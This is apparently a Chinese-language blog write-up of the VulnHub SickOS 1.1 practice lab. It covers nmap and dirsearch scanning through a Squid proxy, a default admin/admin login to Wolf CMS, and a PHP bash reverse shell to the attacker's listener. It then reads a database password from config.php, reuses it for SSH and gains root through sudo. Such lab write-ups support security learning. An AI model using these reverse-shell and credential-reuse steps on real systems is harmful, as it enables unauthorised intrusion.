---
title: VulnHub-SickOS1.1
slug: vulnhubsickos11-z1xib45
url: /post/vulnhubsickos11-z1xib45.html
date: '2025-03-03 14:42:47+08:00'
lastmod: '2025-05-07 21:34:39+08:00'
toc: true
categories:
  - penetration
isCJKLanguage: true
---
日常练习
<!--more-->
# VulnHub-SickOS1.1

## 信息搜集

### 主机发现

```plain
──(kali㉿kali)-[~]
└─$ sudo nmap -sn 192.168.152.0/24  
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-14 02:35 EDT
Nmap scan report for 192.168.152.1
Host is up (0.00029s latency).
MAC Address: 00:50:56:C0:00:08 (VMware)
Nmap scan report for 192.168.152.2
Host is up (0.00020s latency).
MAC Address: 00:50:56:FB:F0:8A (VMware)
Nmap scan report for 192.168.152.135
Host is up (0.00025s latency).
MAC Address: 00:0C:29:E9:D0:28 (VMware)
Nmap scan report for 192.168.152.254
Host is up (0.00033s latency).
MAC Address: 00:50:56:E3:37:B1 (VMware)
Nmap scan report for 192.168.152.131
Host is up.
Nmap done: 256 IP addresses (5 hosts up) scanned in 1.99 seconds
```

### 端口扫描

```plain
┌──(kali㉿kali)-[~]
└─$ sudo nmap --min-rate 10000 -p- 192.168.152.135
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-14 02:36 EDT
Nmap scan report for 192.168.152.135
Host is up (0.00032s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE  SERVICE
22/tcp   open   ssh
3128/tcp open   squid-http
8080/tcp closed http-proxy
MAC Address: 00:0C:29:E9:D0:28 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 13.40 seconds
```

发现开放端口仅存在两个，也就是22和3128，8080端口是关闭的，不可访问

### 详细信息搜集

#### TCP扫描

```plain
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sT -sV -O -p22,3128,8080 192.168.152.135
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-14 03:00 EDT
Nmap scan report for 192.168.152.135
Host is up (0.00050s latency).

PORT     STATE  SERVICE    VERSION
22/tcp   open   ssh        OpenSSH 5.9p1 Debian 5ubuntu1.1 (Ubuntu Linux; protocol 2.0)
3128/tcp open   http-proxy Squid http proxy 3.1.19
8080/tcp closed http-proxy
MAC Address: 00:0C:29:E9:D0:28 (VMware)
Aggressive OS guesses: Linux 3.2 - 4.9 (95%), Linux 4.2 (92%), Linux 3.10 - 4.11 (92%), Linux 3.13 (91%), OpenWrt Chaos Calmer 15.05 (Linux 3.18) or Designated Driver (Linux 4.1 or 4.4) (91%), Linux 4.10 (91%), Android 5.0 - 6.0.1 (Linux 3.4) (91%), Linux 3.2 - 3.10 (91%), Linux 3.2 - 3.16 (91%), Linux 3.13 - 3.16 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.22 seconds
```

暂时没有发现有价值的信息，先进行下一步扫描

#### UDP扫描

```plain
(kali㉿kali)-[~/桌面]
└─$ sudo nmap -sU  192.168.152.135
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-14 03:06 EDT
Nmap scan report for 192.168.152.135
Host is up (0.00027s latency).

PORT     STATE         SERVICE
22/udp   open|filtered ssh
3128/udp open|filtered ndl-aas
8080/udp open|filtered http-alt
MAC Address: 00:0C:29:E9:D0:28 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 1.44 seconds
```

#### vuln脚本扫描

```plain
└─$ sudo nmap -script=vuln -p80,3128,8080 192.168.152.135
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-18 04:01 EDT
Nmap scan report for 192.168.152.135
Host is up (0.00042s latency).

PORT     STATE    SERVICE
80/tcp   filtered http
3128/tcp open     squid-http
8080/tcp closed   http-proxy
MAC Address: 00:0C:29:E9:D0:28 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 12.50 seconds
```

再尝试一下目录爆破

### 目录爆破

```plain
┌──(kali㉿kali)-[~/桌面]
└─$ dirsearch -u 192.168.152.135                                    


  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/桌面/reports/_192.168.152.135/_24-03-18_04-02-33.txt
^[[B^[[B^[[B^[[B^[[B^[[B
Target: http://192.168.152.135/

[04:02:39] Starting:                                                                        

Request timeout: http://192.168.152.135/

Task Completed
```

请求超时，很明显我们使用的是本地实验环境，在局域网中出现这种请求超时明显是不正常的，通过前面的一些提示，也足以联想到是否与之前8080端口显示的代理相关

所以尝试使用3128端口的代理去再重新扫一次

```plain
┌──(kali㉿kali)-[~/桌面]
└─$ dirsearch -u 192.168.152.135 --proxy 192.168.152.135:3128

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/桌面/reports/_192.168.152.135/_24-03-20_05-18-25.txt

Target: http://192.168.152.135/

[05:18:31] Starting: 
[05:18:33] 403 -  245B  - /.ht_wsr.txt                                  
[05:18:33] 403 -  243B  - /.htaccess.bak1                               
[05:18:33] 403 -  244B  - /.htaccess.sample                             
[05:18:33] 403 -  242B  - /.htaccess.save                               
[05:18:33] 403 -  243B  - /.htaccess.orig
[05:18:33] 403 -  244B  - /.htaccess_orig                               
[05:18:33] 403 -  242B  - /.htaccessOLD
[05:18:33] 403 -  243B  - /.htaccess_sc
[05:18:33] 403 -  243B  - /.htaccessOLD2                                
[05:18:33] 403 -  239B  - /.html                                        
[05:18:33] 403 -  239B  - /.htm
[05:18:33] 403 -  242B  - /.htaccessBAK
[05:18:33] 403 -  243B  - /.httr-oauth                                  
[05:18:33] 403 -  247B  - /.htpasswd_test
[05:18:33] 403 -  245B  - /.htaccess_extra                              
[05:18:33] 403 -  243B  - /.htpasswds                                   
[05:18:46] 403 -  242B  - /cgi-bin/                                     
[05:18:48] 200 -  109B  - /connect                                      
[05:18:50] 403 -  241B  - /doc/api/                                     
[05:18:50] 403 -  246B  - /doc/html/index.html
[05:18:50] 403 -  239B  - /doc/
[05:18:50] 403 -  248B  - /doc/en/changes.html                          
[05:18:50] 403 -  247B  - /doc/stable.version
[05:19:05] 200 -   58B  - /robots.txt                                   
[05:19:06] 403 -  243B  - /server-status                                
[05:19:06] 403 -  243B  - /server-status/                               
                                                                         
Task Completed
```

这次成功扫出了基础的信息

## web渗透

将浏览器的代理设置到刚刚的ip和端口

访问到robots.txt

```plain
User-agent: *
Disallow: /
Dissalow: /wolfcms
```

发现存在wolfcms的信息

访问connect，发现存在一些信息

```plain
#!/usr/bin/python

print "I Try to connect things very frequently\n"
print "You may want to try my services"
```

通过搜索引擎找到一个管理员路径/wolfcms/?/admin

尝试弱口令，如果无果则选择爆破

通过admin，admin成功登录

​![](https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Pic/network-asset-iDpqszw1FNnLmTR-20250303144338-f8ch0ec.png)​

发现很多页面都存在可执行的php代码，尝试插入一段代码，一句话木马或者反弹shell都行

将这段代码插入页面，然后开一个监听端口，访问刚刚编辑后的页面

```plain
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.152.131/1234 0>&1'"); ?>
```

拿到一个权限

```plain
┌──(kali㉿kali)-[~/桌面]
└─$ nc -lnvp 1234   
listening on [any] 1234 ...
connect to [192.168.152.131] from (UNKNOWN) [192.168.152.135] 53138
bash: no job control in this shell
www-data@SickOs:/var/www/wolfcms$ whoami
whoami
www-data
www-data@SickOs:/var/www/wolfcms$ uname -a
uname -a
Linux SickOs 3.11.0-15-generic #25~precise1-Ubuntu SMP Thu Jan 30 17:42:40 UTC 2014 i686 athlon i386 GNU/Linux
www-data@SickOs:/var/www/wolfcms$ ip a
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN 
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN qlen 1000
    link/ether 00:0c:29:e9:d0:28 brd ff:ff:ff:ff:ff:ff
    inet 192.168.152.135/24 brd 192.168.152.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::20c:29ff:fee9:d028/64 scope link 
       valid_lft forever preferred_lft forever
```

现在开始查找办法

查看当前目录，并且发现存在一个config.php文件

```plain
www-data@SickOs:/var/www/wolfcms$ ls
ls
CONTRIBUTING.md
README.md
composer.json
config.php
docs
favicon.ico
index.php
public
robots.txt
wolf
www-data@SickOs:/var/www/wolfcms$ cat config.php
cat config.php
<?php 

// Database information:
// for SQLite, use sqlite:/tmp/wolf.db (SQLite 3)
// The path can only be absolute path or :memory:
// For more info look at: www.php.net/pdo

// Database settings:
define('DB_DSN', 'mysql:dbname=wolf;host=localhost;port=3306');
define('DB_USER', 'root');
define('DB_PASS', 'john@123');
define('TABLE_PREFIX', '');

// Should Wolf produce PHP error messages for debugging?
define('DEBUG', false);

// Should Wolf check for updates on Wolf itself and the installed plugins?
define('CHECK_UPDATES', true);

// The number of seconds before the check for a new Wolf version times out in case of problems.
define('CHECK_TIMEOUT', 3);

// The full URL of your Wolf CMS install
define('URL_PUBLIC', '/wolfcms/');

// Use httpS for the backend?
// Before enabling this, please make sure you have a working HTTP+SSL installation.
define('USE_HTTPS', false);

// Use HTTP ONLY setting for the Wolf CMS authentication cookie?
// This requests browsers to make the cookie only available through HTTP, so not javascript for example.
// Defaults to false for backwards compatibility.
define('COOKIE_HTTP_ONLY', false);

// The virtual directory name for your Wolf CMS administration section.
define('ADMIN_DIR', 'admin');

// Change this setting to enable mod_rewrite. Set to "true" to remove the "?" in the URL.
// To enable mod_rewrite, you must also change the name of "_.htaccess" in your
// Wolf CMS root directory to ".htaccess"
define('USE_MOD_REWRITE', false);

// Add a suffix to pages (simluating static pages '.html')
define('URL_SUFFIX', '.html');

// Set the timezone of your choice.
// Go here for more information on the available timezones:
// http://php.net/timezones
define('DEFAULT_TIMEZONE', 'Asia/Calcutta');

// Use poormans cron solution instead of real one.
// Only use if cron is truly not available, this works better in terms of timing
// if you have a lot of traffic.
define('USE_POORMANSCRON', false);

// Rough interval in seconds at which poormans cron should trigger.
// No traffic == no poormans cron run.
define('POORMANSCRON_INTERVAL', 3600);

// How long should the browser remember logged in user?
// This relates to Login screen "Remember me for xxx time" checkbox at Backend Login screen
// Default: 1800 (30 minutes)
define ('COOKIE_LIFE', 1800);  // 30 minutes

// Can registered users login to backend using their email address?
// Default: false
define ('ALLOW_LOGIN_WITH_EMAIL', false);

// Should Wolf CMS block login ability on invalid password provided?
// Default: true
define ('DELAY_ON_INVALID_LOGIN', true);

// How long should the login blockade last?
// Default: 30 seconds
define ('DELAY_ONCE_EVERY', 30); // 30 seconds

// First delay starts after Nth failed login attempt
// Default: 3
define ('DELAY_FIRST_AFTER', 3);

// Secure token expiry time (prevents CSRF attacks, etc.)
// If backend user does nothing for this time (eg. click some link) 
// his token will expire with appropriate notification
// Default: 900 (15 minutes)
define ('SECURE_TOKEN_EXPIRY', 900);  // 15 minutes
```

发现存在一个账户密码

```plain
define('DB_USER', 'root');
define('DB_PASS', 'john@123');
```

查看一下当前的用户

```plain
www-data@SickOs:/var/www/wolfcms$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:103::/home/syslog:/bin/false
messagebus:x:102:105::/var/run/dbus:/bin/false
whoopsie:x:103:106::/nonexistent:/bin/false
landscape:x:104:109::/var/lib/landscape:/bin/false
sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
sickos:x:1000:1000:sickos,,,:/home/sickos:/bin/bash
mysql:x:106:114:MySQL Server,,,:/nonexistent:/bin/false
```

挨个尝试是否能通过密码进行ssh登录操作

成功登录上sickos用户

```plain
┌──(kali㉿kali)-[~/桌面]
└─$ ssh sickos@192.168.152.135
The authenticity of host '192.168.152.135 (192.168.152.135)' can't be established.
ECDSA key fingerprint is SHA256:fBxcsD9oGyzCgdxtn34OtTEDXIW4E9/RlkxombNm0y8.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.152.135' (ECDSA) to the list of known hosts.
sickos@192.168.152.135's password: 
Permission denied, please try again.
sickos@192.168.152.135's password: 
Welcome to Ubuntu 12.04.4 LTS (GNU/Linux 3.11.0-15-generic i686)

 * Documentation:  https://help.ubuntu.com/

  System information as of Wed Mar 20 15:30:12 IST 2024

  System load:  0.0               Processes:           116
  Usage of /:   4.3% of 28.42GB   Users logged in:     0
  Memory usage: 12%               IP address for eth0: 192.168.152.135
  Swap usage:   0%

  Graph this data and manage this system at:
    https://landscape.canonical.com/

124 packages can be updated.
92 updates are security updates.

New release '14.04.3 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Last login: Tue Sep 22 08:32:44 2015
```

## Linux提权

查看当前权限

```plain
sickos@SickOs:~$ sudo -l
[sudo] password for sickos: 
Matching Defaults entries for sickos on this host:
    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User sickos may run the following commands on this host:
    (ALL : ALL) ALL
```

很明显直接sudo su即可

```plain
root@SickOs:~# cat a0216ea4d51874464078c618298b1367.txt
^BIf you are viewing this!!

ROOT!

You have Succesfully completed SickOS1.1.
Thanks for Trying
```

‍
